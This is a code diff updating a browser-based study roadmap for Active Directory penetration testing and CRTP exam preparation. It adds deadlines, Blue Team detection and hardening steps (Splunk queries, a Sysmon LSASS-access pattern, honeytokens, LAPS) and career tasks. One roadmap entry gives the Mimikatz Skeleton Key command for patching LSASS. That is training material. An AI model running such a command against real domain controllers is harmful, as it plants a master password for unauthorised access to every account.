+                { title: "Skeleton Key", desc: "Patch LSASS to accept master password.", cmd: "mimikatz misc::skeleton" }
             ]
         },
         { 
-            id: 5, type: 'check', title: "Blue Team (Defense)", icon: "🛡️", 
+            id: 5, type: 'check', title: "Blue Team (Defense)", icon: "🛡️", deadline: "Apr 10, 2026",
             items: [
-                { title: "Detect: Kerberoasting", desc: "Hunt for Event ID 4769 where Ticket Encryption Type is 0x17 (RC4). Modern windows uses AES (0x12/0x11).", cmd: "Splunk: index=* EventCode=4769 Ticket_Encryption_Type=0x17" },
-                { title: "Detect: Golden Ticket", desc: "Look for TGTs with lifetimes > 10 hours (default) or mismatched SIDs.", cmd: "Event ID 4624 (Logon) -> Look for Admin Logon from non-standard workstation" }
+                { title: "Audit Policy", desc: "Enable Advanced Audit Policy (Logon, Object Access).", cmd: "GPMC.msc -> Comp Config -> Policies -> Security -> Adv Audit" },
+                { title: "Event 4769", desc: "Detect Kerberoasting (RC4 / 0x17 encryption request).", cmd: "Splunk: EventCode=4769 Ticket_Encryption=0x17" },
+                { title: "Event 4624", desc: "Analyze Logon Types (Type 3 = Network, Type 10 = RDP).", cmd: "Splunk: EventCode=4624 Logon_Type=3" },
+                { title: "Event 4688", desc: "Process Creation. Look for powershell.exe with -enc.", cmd: "Splunk: EventCode=4688 CommandLine=*encoded*" },
+                { title: "Golden Ticket", desc: "Detect TGTs with >10hr lifetime or blank fields.", cmd: "Analyze Ticket Age statistics" },
+                { title: "DCSync Detect", desc: "Detect DS-Replication-Get-Changes from non-DC IPs.", cmd: "Event ID 4662" },
+                { title: "Honeytokens", desc: "Create 'fake' admin accounts. Alert on ANY usage.", cmd: "New-ADUser 'Admin_Trap'" },
+                { title: "Canary Service", desc: "Create 'fake' SPN. Alert on 4769 request.", cmd: "Splunk Alert: ServiceName=HoneySPN" },
+                { title: "Sysmon Config", desc: "Tune Sysmon to catch LSASS dumping (Event 10).", cmd: "TargetImage='lsass.exe' GrantedAccess='0x1F3FFF'" },
+                { title: "LAPS Deployment", desc: "Install LAPS to randomize local admin passwords.", cmd: "Deploy LAPS Agent" },
+                { title: "Protected Users", desc: "Add Admins to 'Protected Users' (No NTLM/Cache).", cmd: "Add-ADGroupMember 'Protected Users'" },
+                { title: "Tier Model", desc: "Implement Admin Tiering (T0/T1/T2) GPOs.", cmd: "Deny T0 Logon on T1/T2 workstations" },
+                { title: "Credential Guard", desc: "Enable Credential Guard to protect LSASS.", cmd: "Group Policy -> Virtualization Based Security" },
+                { title: "Attack Surface Red", desc: "Disable Print Spooler on DC (PrintNightmare).", cmd: "Stop-Service Spooler; Set-Service Spooler -StartMode Disabled" },
+                { title: "Defense Report", desc: "Write a findings report. 'Detected X via Event Y'.", cmd: "Format: Observation, Risk, Remediation" }
             ]
         },
         { 
-            id: 6, type: 'check', title: "CRTP Certification", icon: "🎓", 
+            id: 6, type: 'check', title: "CRTP & Career", icon: "🎓", deadline: "May 05, 2026",
             items: [
-                { title: "CRTP Lab Completion", desc: "Complete all Learning Objectives in the pentester academy portal.", cmd: "Action: Submit all 40 flags" },
-                { title: "CRTP Exam", desc: "24-Hour Exam. compromise 5 machines + DC. Write report.", cmd: "Objective: Domain Admin in < 24h" }
+                { title: "Purchase Course", desc: "PentesterAcademy/AlteredSecurity CRTP.", cmd: "Budget: ~$299" },
+                { title: "Videos 1-5", desc: "Infrastructure, Enum, Local Privesc.", cmd: "Study & Notes" },
+                { title: "Videos 6-10", desc: "Lateral Movement, Session Hunting.", cmd: "Study & Notes" },
+                { title: "Videos 11-14", desc: "Persistence, Defense, Forest Attacks.", cmd: "Study & Notes" },
+                { title: "Lab Flags 1-10", desc: "Basic enum and roasting.", cmd: "Submit Flags" },
+                { title: "Lab Flags 11-20", desc: "Delegation and ACLs.", cmd: "Submit Flags" },
+                { title: "Lab Flags 21-30", desc: "Cross-Forest & Trusts.", cmd: "Submit Flags" },
+                { title: "Lab Flags 31-40", desc: "Advanced attacks & Persistence.", cmd: "Submit Flags" },
+                { title: "Mock Exam 1", desc: "Self-timed 12h session. Try to root 3 boxes.", cmd: "Simulate pressure" },
+                { title: "Schedule Exam", desc: "Book the 24h slot. Clear your schedule.", cmd: "Calendar Invite" },
+                { title: "Exam Execution", desc: "24h to compromise the OS/AD. Screenshot everything.", cmd: "Tools: CherryTree/Obsidian" },
+                { title: "Report Writing", desc: "Write professional report. Executive + Tech.", cmd: "Template: OS-CP style" },
+                { title: "Report Sanitization", desc: "Create a redacted version for your portfolio.", cmd: "Remove sensitive IPs/Names" },
+                { title: "Resume Polish", desc: "Add 'CRTP' and 'Active Directory' skills.", cmd: "Keyword Optimization" },
+                { title: "Salary Negotiate", desc: "Prepare for the $600+ offer conversation.", cmd: "Research Market Rates" }
             ]
         },
-        { id: 7, type: 'war_room', title: "OffSec Labs (War Room)", icon: "💀", labs: ["Access", "Heist", "Vault", "Nagoya", "Hokkaido", "Resourced", "Hutch", "Alpha", "Beta", "Gamma"] }
+        { id: 7, type: 'war_room', title: "OffSec Labs (War Room)", icon: "💀", deadline: "June 01, 2026", labs: ["Access", "Heist", "Vault", "Nagoya", "Hokkaido", "Resourced", "Hutch", "Alpha", "Beta", "Gamma"] }
     ];
 
     // --- 2. STATE ---
-    let progress = JSON.parse(localStorage.getItem('titan_v9_prog')) || {};
-    let warData = JSON.parse(localStorage.getItem('titan_v9_war')) || {};
+    let progress = JSON.parse(localStorage.getItem('titan_v11_prog')) || {};
+    let warData = JSON.parse(localStorage.getItem('titan_v11_war')) || {};
 
     // --- 3. INIT ---
     function init() {
@@ -316,19 +419,25 @@
                 phase.labs.forEach((_, i) => { if(warData[i]?.status === 'root') rooted++; });
                 pct = Math.round((rooted/phase.labs.length)*100);
             }
-
-            const card = document.createElement('div');
-            card.className = 'phase-card';
-            card.onclick = () => openPhase(idx);
             
-            card.innerHTML = `
-                <div class="phase-icon">${phase.icon}</div>
-                <div class="phase-num">PHASE ${idx+1}</div>
-                <div class="phase-title">${phase.title}</div>
-                <div class="phase-progress"><span>${pct}% MASTERED</span></div>
-                <div class="bar-bg"><div class="mini-bar" style="width:${pct}%; background:${pct===100?'var(--success)':'linear-gradient(90deg, var(--primary), var(--accent))'}; height:100%"></div></div>
+            // Animation Delay
+            const delay = idx * 0.1;
+
+            grid.innerHTML += `
+                <div class="phase-card" onclick="openPhase(${idx})" style="animation-delay: ${delay}s">
+                    <div class="phase-header">
+                        <div class="phase-icon">${phase.icon}</div>
+                        <div class="deadline-badge">DUE: ${phase.deadline}</div>
+                    </div>
+                    <div class="phase-num">PHASE ${idx+1}</div>
+                    <div class="phase-title">${phase.title}</div>
+                    <div style="display:flex; justify-content:space-between; font-size:0.7rem; font-weight:bold; margin-top:auto;">
+                        <span>PROGRESS</span>
+                        <span style="color:${pct===100?'var(--success)':'var(--accent)'}">${pct}%</span>
+                    </div>
+                    <div class="mini-bar"><div class="mini-fill" style="width:${pct}%; background:${pct===100?'var(--success)':'var(--accent)'}"></div></div>
+                </div>
             `;
-            grid.appendChild(card);
         });
     }
 
@@ -336,7 +445,6 @@
     function openPhase(id) {
         document.getElementById('view-map').classList.add('hidden');
         document.getElementById('view-detail').classList.remove('hidden');
-        
         const phase = roadmap[id];
         document.getElementById('dt-title').innerText = phase.title;
 
@@ -368,27 +476,25 @@
         phase.items.forEach((item, idx) => {
             const itemData = phaseData[idx] || {};
             const isDone = !!itemData.date;
+            const num = (idx + 1).toString().padStart(2, '0');
             
             const card = document.createElement('div');
             card.className = `mission-card ${isDone ? 'mastered' : ''}`;
             card.innerHTML = `
                 <div class="m-header" onclick="this.parentElement.classList.toggle('open')">
-                    <div class="m-title">${item.title}</div>
-                    <div class="m-date">${isDone ? 'MASTERED: ' + itemData.date : ''}</div>
+                    <div class="m-title"><span class="m-num">${num}</span> ${item.title}</div>
+                    <div class="m-date">${isDone ? 'DONE: ' + itemData.date : ''}</div>
                 </div>
                 <div class="m-body">
                     <div class="m-content">
-                        <span class="lbl" style="color:var(--primary)">STRATEGIC INTEL</span>
+                        <span class="lbl">STRATEGY</span>
                         <div class="m-desc">${item.desc}</div>
-                        
-                        <span class="lbl" style="color:var(--accent)">EXECUTION</span>
+                        <span class="lbl">EXECUTION</span>
                         <div class="m-cmd">${item.cmd}</div>
-                        
-                        <span class="lbl" style="color:#888">FIELD NOTES</span>
-                        <textarea class="m-notes" placeholder="Notes..." oninput="saveNote(${pid}, ${idx}, this.value)">${itemData.notes || ''}</textarea>
-                        
+                        <span class="lbl" style="color:#888;">FIELD NOTES</span>
+                        <textarea class="m-notes" placeholder="Private Notes..." oninput="saveNote(${pid}, ${idx}, this.value)">${itemData.notes || ''}</textarea>
                         <button class="m-btn" onclick="toggleMission(${pid}, ${idx})">
-                            ${isDone ? 'RE-OPEN MISSION' : 'MARK MASTERED & SIGN OFF'}
+                            ${isDone ? 'RE-OPEN' : 'MARK MASTERED'}
                         </button>
                     </div>
                 </div>
@@ -400,14 +506,14 @@
     function toggleMission(pid, tid) {
         if(!progress[pid]) progress[pid] = {};
         if(progress[pid][tid]?.date) {
-            progress[pid][tid].date = null; // Uncheck
+            progress[pid][tid].date = null; 
         } else {
-            const today = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+            const today = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
             if(!progress[pid][tid]) progress[pid][tid] = { notes: '' };
             progress[pid][tid].date = today;
         }
-        localStorage.setItem('titan_v9_prog', JSON.stringify(progress));
-        openPhase(pid); // Refresh
+        localStorage.setItem('titan_v11_prog', JSON.stringify(progress));
+        openPhase(pid);
         updateGlobal();
     }
 
@@ -415,13 +521,13 @@
         if(!progress[pid]) progress[pid] = {};
         if(!progress[pid][tid]) progress[pid][tid] = { date: null, notes: '' };
         progress[pid][tid].notes = val;
-        localStorage.setItem('titan_v9_prog', JSON.stringify(progress));
+        localStorage.setItem('titan_v11_prog', JSON.stringify(progress));
     }
 
     // --- 7. WAR ROOM ---
     function renderWarRoom(phase, container) {
         let root=0, win=0, lin=0;
-        phase.labs.forEach((_, i) => {
+        phase.labs.forEach((_,i) => {
             const d = warData[i] || {};
             if(d.status==='root') root++;
             if((d.os||'win')==='win' && d.status==='root') win++;
@@ -430,11 +536,11 @@
 
         const html = `
             <div class="wr-stats">
-                <div class="wr-card" style="border-color:var(--st-root)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--st-root)">${root}</span><br><span style="font-size:0.7rem;">PWNED</span></div></div>
-                <div class="wr-card" style="border-color:var(--accent)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--accent)">${win}</span><br><span style="font-size:0.7rem;">WIN</span></div></div>
-                <div class="wr-card" style="border-color:var(--st-scan)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--st-scan)">${lin}</span><br><span style="font-size:0.7rem;">LINUX</span></div></div>
+                <div class="wr-card" style="border-color:var(--success)"><div><span class="wr-val" style="color:var(--success)">${root}</span><br><span class="wr-label">PWNED</span></div></div>
+                <div class="wr-card" style="border-color:var(--accent)"><div><span class="wr-val" style="color:var(--accent)">${win}</span><br><span class="wr-label">WIN</span></div></div>
+                <div class="wr-card" style="border-color:var(--primary)"><div><span class="wr-val" style="color:var(--primary)">${lin}</span><br><span class="wr-label">LINUX</span></div></div>
             </div>
-            <div style="display:grid; grid-template-columns:50px 1.5fr 1fr 1fr 1.5fr 2fr; padding:10px; font-size:0.7rem; color:#888; font-weight:bold;">
+            <div style="display:grid; grid-template-columns:40px 1.5fr 1fr 1fr 1.5fr 2fr; padding:10px; font-size:0.7rem; color:#888; font-weight:bold;">
                 <div>OS</div> <div>TARGET</div> <div>IP</div> <div>STATUS</div> <div>VECTOR</div> <div>NOTES</div>
             </div>
             <div id="wr-rows"></div>
@@ -449,14 +555,15 @@
                 <div class="wr-row" data-status="${d.status}">
                     <div style="cursor:pointer; text-align:center;" onclick="toggleOS(${idx})">${icon}</div>
                     <div style="font-weight:bold;">${name}</div>
-                    <div><input class="wr-input" value="${d.ip}" placeholder="IP..." oninput="saveWar(${idx}, 'ip', this.value)"></div>
+                    <div><input class="wr-input" value="${d.ip}" placeholder="IP" oninput="saveWar(${idx}, 'ip', this.value)"></div>
                     <div>
                         <select class="wr-select" onchange="saveWar(${idx}, 'status', this.value)" style="color:var(--st-${d.status});">
                             <option value="todo" ${d.status==='todo'?'selected':''}>To Do</option>
-                            <option value="scan" ${d.status==='scan'?'selected':''}>Scanning</option>
-                            <option value="foot" ${d.status==='foot'?'selected':''}>Foothold</option>
-                            <option value="priv" ${d.status==='priv'?'selected':''}>PrivEsc</option>
-                            <option value="root" ${d.status==='root'?'selected':''}>ROOTED</option>
+                            <option value="scan" ${d.status==='scan'?'selected':''}>Scan</option>
+                            <option value="foot" ${d.status==='foot'?'selected':''}>Foot</option>
+                            <option value="priv" ${d.status==='priv'?'selected':''}>Priv</option>
+                            <option value="root" ${d.status==='root'?'selected':''}>ROOT</option>
+                            <option value="stuck" ${d.status==='stuck'?'selected':''}>Stuck</option>
                         </select>
                     </div>
                     <div><input class="wr-input" value="${d.vec}" placeholder="Vector" oninput="saveWar(${idx}, 'vec', this.value)"></div>
@@ -477,8 +584,8 @@
         saveWarData();
     }
     function saveWarData() {
-        localStorage.setItem('titan_v9_war', JSON.stringify(warData));
-        openPhase(7); // refresh
+        localStorage.setItem('titan_v11_war', JSON.stringify(warData));
+        openPhase(7);
         updateGlobal();
     }
 
@@ -494,7 +601,7 @@
                 p.labs.forEach((_,i) => { if(warData[i]?.status === 'root') done++; });
             }
         });
-        const pct = Math.round((done/total)*100);
+        const pct = total === 0 ? 0 : Math.round((done/total)*100);
         document.getElementById('global-bar').style.width = pct + '%';
         document.getElementById('global-percent').innerText = pct + '%';
     }
@@ -508,7 +615,7 @@
     }
     
     function hardReset() {
-        if(confirm("Reset all progress?")) {
+        if(confirm("Factory Reset? This deletes all progress.")) {
             localStorage.clear();
             location.reload();
         }
